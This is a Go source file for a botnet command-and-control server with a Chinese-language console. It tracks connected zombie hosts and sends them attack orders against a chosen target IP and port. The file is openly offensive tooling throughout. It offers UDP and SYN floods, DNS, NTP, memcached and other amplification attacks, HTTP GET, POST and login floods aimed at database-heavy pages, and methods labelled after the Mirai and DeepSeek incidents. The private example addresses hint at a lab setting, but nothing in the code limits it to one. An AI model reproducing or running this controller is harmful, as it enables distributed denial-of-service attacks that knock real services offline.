package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type BotInfo struct {
	Conn           net.Conn
	ConnectTime    time.Time
	LastActive     time.Time
	DisconnectTime time.Time
	Status         string
	CurrentTask    string
}

var (
	bots  = make(map[string]*BotInfo)
	botMu sync.Mutex
)

func main() {
	showBanner()
	go startC2Server()
	handleUserInput()
}

func showBanner() {
	fmt.Println(`
  ____ ____   ___   ___   ___  
 / ___|___ \ / _ \ / _ \ / _ \ 
| |     __) | | | | | | | | | |
| |___ / __/| |_| | |_| | |_| |
 \____|_____|\___/ \___/ \___/  v2.1`)

	fmt.Println("\nC2 控制中心已初始化")
	fmt.Println("输入 'help' 查看可用命令")
}

func startC2Server() {
	listener, err := net.Listen("tcp", ":80")
	if err != nil {
		fmt.Println("C2 服务器启动失败:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Println("\n[+] C2 服务器正在监听 0.0.0.0:80")
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("连接错误:", err)
			continue
		}
		go handleNewBot(conn)
	}
}

func handleNewBot(conn net.Conn) {
	botIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()
	now := time.Now()

	bot := &BotInfo{
		Conn:        conn,
		ConnectTime: now,
		LastActive:  now,
		Status:      "在线",
	}

	botMu.Lock()
	bots[botIP] = bot
	botMu.Unlock()

	logConnection(botIP)
	fmt.Printf("[+] 新僵尸主机已连接: %s\n", botIP)

	go monitorBotConnection(bot, botIP)
}

func monitorBotConnection(bot *BotInfo, botIP string) {
	defer func() {
		bot.Conn.Close()
		botMu.Lock()
		bot.Status = "离线"
		bot.DisconnectTime = time.Now()
		botMu.Unlock()
		fmt.Printf("[!] 僵尸主机已断开连接: %s\n", botIP)
	}()

	reader := bufio.NewReader(bot.Conn)
	for {
		msg, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		botMu.Lock()
		bot.LastActive = time.Now()
		processBotMessage(bot, msg)
		botMu.Unlock()

		fmt.Printf("[%s] 状态更新: %s", botIP, msg)
	}
}

func processBotMessage(bot *BotInfo, msg string) {
	msg = strings.TrimSpace(msg)
	switch {
	case msg == "TASK_COMPLETE":
		bot.Status = "在线"
		bot.CurrentTask = ""
	case msg == "STOP":
		bot.Status = "空闲"
		bot.CurrentTask = ""
	case strings.HasPrefix(msg, "TASK_PROGRESS "):
		bot.CurrentTask = strings.TrimPrefix(msg, "TASK_PROGRESS ")
	}
}

func logConnection(ip string) {
	file, err := os.OpenFile("bots.log", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return
	}
	defer file.Close()
	file.WriteString(fmt.Sprintf("[%s] %s\n", time.Now().Format(time.RFC3339), ip))
}

func handleUserInput() {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("\nC2> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		args := strings.Fields(input)
		if len(args) == 0 {
			continue
		}

		command := strings.ToLower(args[0])

		switch command {
		case "attack":
			handleAttackCommand(args[1:])
		case "list":
			showBotList()
		case "info":
			showBotInfo(args[1:])
		case "clear":
			clearScreen()
		case "help":
			showHelp()
		case "stop":
			handleStopCommand(args[1:])
		case "exit":
			cleanExit()
		default:
			fmt.Println("[!] 未知命令，请输入 'help' 查看可用命令")
		}
	}
}

func handleAttackCommand(args []string) {
	if len(args) < 3 {
		fmt.Println("[!] 使用方法: attack <方法> <目标IP> <端口> [可选参数]")
		fmt.Println("可用方法: UDP, SYN, DNS, NTP, CLDAP, RDP, SSDP, SNMP, CHARGEN, OPENVPN, MEMCACHED, DNSBomb, DNSBoomerang, GET, COOKIE, POST, LOGIN, DEEPSEEK_1, DEEPSEEK_2, MIRAI_1, MIRAI_2")
		return
	}

	method := strings.ToUpper(args[0])
	target := args[1]
	port := args[2]
	
	// 定义需要路径参数的HTTP相关攻击方法
	httpMethods := map[string]bool{
		"GET":    true,
		"COOKIE": true,
		"POST":   true,
		"LOGIN":  true,
		"DEEPSEEK_2": true,
	}

	// 处理可选参数
	param4 := ""
	var botIP string

	// 第四个参数的处理逻辑根据攻击方法而不同
	if len(args) > 3 {
		// 如果是HTTP相关攻击，第四个参数是路径
		if httpMethods[method] {
			param4 = args[3]
			// 如果还有第五个参数，那么它是僵尸主机IP
			if len(args) > 4 {
				botIP = args[4]
			}
		} else {
			// 对于非HTTP攻击，检查第四个参数是否是IP地址
			if net.ParseIP(args[3]) != nil {
				botIP = args[3]
			} else {
				// 不是IP地址，作为其他攻击参数
				param4 = args[3]
			}
			// 如果有第五个参数，则一定是指定僵尸主机
			if len(args) > 4 {
				botIP = args[4]
			}
		}
	}

	validMethods := map[string]bool{
		"UDP":          true,
		"SYN":          true,
		"DNS":          true,
		"NTP":          true,
		"CLDAP":        true,
		"RDP":          true,
		"SSDP":         true,
		"SNMP":         true,
		"CHARGEN":      true,
		"OPENVPN":      true,
		"MEMCACHED":    true,
		"DNSBOMB":      true,
		"DNSBOOMERANG": true,
		"GET":          true,
		"COOKIE":       true,
		"POST":         true,
		"LOGIN":        true,
		"DEEPSEEK_1":   true,
		"DEEPSEEK_2":   true,
		"MIRAI_1":      true,
		"MIRAI_2":      true,
	}

	if !validMethods[method] {
		fmt.Println("[!] 无效的攻击方法")
		return
	}

	// 构建命令字符串，确保全部大写
	command := fmt.Sprintf("%s %s %s %s", method, target, port, param4)
	sendBotCommand(command, botIP)
}

func sendBotCommand(command, botIP string) {
	botMu.Lock()
	defer botMu.Unlock()

	sent := 0
	if botIP != "" {
		if bot, exists := bots[botIP]; exists && bot.Status == "在线" {
			// 直接发送命令，不再发送 STOP
			if sendCommandToBot(bot, command) {
				bot.Status = "在线"
				bot.CurrentTask = command
				sent++
			}
		} else {
			fmt.Printf("[!] 指定的僵尸主机不可用: %s\n", botIP)
			return
		}
	} else {
		for _, bot := range bots {
			if bot.Status == "在线" {
				// 直接发送命令，不再发送 STOP
				if sendCommandToBot(bot, command) {
					bot.CurrentTask = command
					sent++
				}
			}
		}
	}

	fmt.Printf("\n[+] 成功发送命令至 %d 个僵尸主机\n", sent)
}

func sendCommandToBot(bot *BotInfo, command string) bool {
	_, err := fmt.Fprintf(bot.Conn, "%s\n", command)
	if err != nil {
		bot.Status = "离线"
		return false
	}
	return true
}

func showBotList() {
	botMu.Lock()
	defer botMu.Unlock()

	fmt.Println("\n活动僵尸主机列表:")
	fmt.Printf("%-18s %-22s %-22s %-8s %s\n",
		"IP 地址", "连接时间", "最后活跃时间", "状态", "当前任务")

	for ip, bot := range bots {
		status := ""
		switch bot.Status {
		case "在线":
			status = "\033[32m在线\033[0m"
		case "离线":
			status = "\033[31m离线\033[0m"
		default:
			status = bot.Status
		}

		task := bot.CurrentTask
		if task == "" {
			task = "空闲"
		}

		fmt.Printf("%-18s %-22s %-22s %-8s %s\n",
			ip,
			bot.ConnectTime.Format("2006-01-02 15:04:05"),
			bot.LastActive.Format("2006-01-02 15:04:05"),
			status,
			task)
	}
}

func clearScreen() {
	fmt.Print("\033[H\033[2J")
}

func showHelp() {
	fmt.Println(`
可用命令:
  attack <方法> <目标IP> <端口> [可选参数] [僵尸主机IP] - 发起攻击
  list                                               - 列出所有僵尸主机
  info <僵尸主机IP>                                  - 显示僵尸主机详情
  clear                                              - 清屏
  help                                               - 显示帮助
  stop                                               - 终止指定僵尸主机/全部僵尸主机
  exit                                               - 退出程序

攻击方法:
  UDP           - UDP 洪水攻击
  SYN           - TCP SYN 洪水
  DNS           - DNS 放大攻击
  NTP           - NTP 攻击
  CLDAP         - CLDAP 攻击
  RDP           - RDP 攻击
  SSDP          - SSDP 攻击
  SNMP          - SNMP 攻击
  CHARGEN       - CHARGEN 攻击
  OPENVPN       - OPENVPN 攻击
  MEMCACHED     - MEMCACHED 攻击
  DNSBOMB       - 24年IEEE S&P论文中的脉冲DoS攻击
  DNSBOOMERANG  - 脉冲DNS攻击
  GET           - HTTP GET 请求网页，需要指定攻击路径，建议请求需要数据库交互的页面
  COOKIE        - HTTP GET 发送大量 Cookie 请求，需要指定攻击路径
  POST          - HTTP POST 洪水攻击，需要指定攻击路径，请求体默认
  LOGIN         - HTTP POST 发送大量登录请求，需要指定攻击路径
  DEEPSEEK_1    - DeepSeek 第一阶段攻击
  DEEPSEEK_2    - DeepSeek 第二阶段攻击
  MIRAI_1       - Mirai 模拟攻击Kerbs
  MIRAI_2       - Mirai 模拟攻击Dyn

示例:
  attack UDP 192.168.1.100 80
  attack SYN 10.0.0.5 443 192.168.2.15
  attack GET 10.100.0.150 80 /history.html
  attack POST 10.100.0.150 80 /login.php
  stop 10.0.0.1                           - 终止指定僵尸主机
  stop                                    - 终止所有僵尸主机`)
}

func cleanExit() {
	fmt.Println("\n[!] 正在断开所有僵尸主机连接...")
	botMu.Lock()
	for _, bot := range bots {
		bot.Conn.Close()
	}
	botMu.Unlock()
	os.Exit(0)
}

func showBotInfo(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] 请指定僵尸主机 IP")
		return
	}

	botIP := args[0]
	botMu.Lock()
	defer botMu.Unlock()

	if bot, exists := bots[botIP]; exists {
		fmt.Printf("\n僵尸主机详情 - %s\n", botIP)
		fmt.Println("--------------------------------------")
		fmt.Printf("状态:        %s\n", bot.Status)
		fmt.Printf("连接时间:    %s\n", bot.ConnectTime.Format("2006-01-02 15:04:05"))
		fmt.Printf("最后活跃时间: %s\n", bot.LastActive.Format("2006-01-02 15:04:05"))
		if bot.Status == "离线" {
			fmt.Printf("断开时间:    %s\n", bot.DisconnectTime.Format("2006-01-02 15:04:05"))
		}
		fmt.Printf("当前任务:    %s\n", bot.CurrentTask)
		fmt.Printf("连接状态:    %v\n", bot.Conn)
		fmt.Println("--------------------------------------")
	} else {
		fmt.Println("[!] 指定的僵尸主机未找到")
	}
}

func handleStopCommand(args []string) {
	if len(args) == 0 {
		sendStopToAllBots()
	} else {
		ip := args[0]
		sendStopToSpecificBot(ip)
	}
}

func sendStopToAllBots() {
	botMu.Lock()
	defer botMu.Unlock()

	sentCount := 0
	for _, bot := range bots {
		if bot.Status == "在线" {
			sendCommandToBot(bot, "STOP")
			sentCount++
		}
	}
	fmt.Printf("[+] 已向 %d 个在线僵尸主机发送停止指令\n", sentCount)
}

func sendStopToSpecificBot(ip string) {
	botMu.Lock()
	defer botMu.Unlock()

	if bot, exists := bots[ip]; exists && bot.Status == "在线" {
		sendCommandToBot(bot, "STOP")
		fmt.Printf("[+] 已向 %s 发送停止指令\n", ip)
	} else {
		fmt.Printf("[!] %s 不在线或不存在\n", ip)
	}
}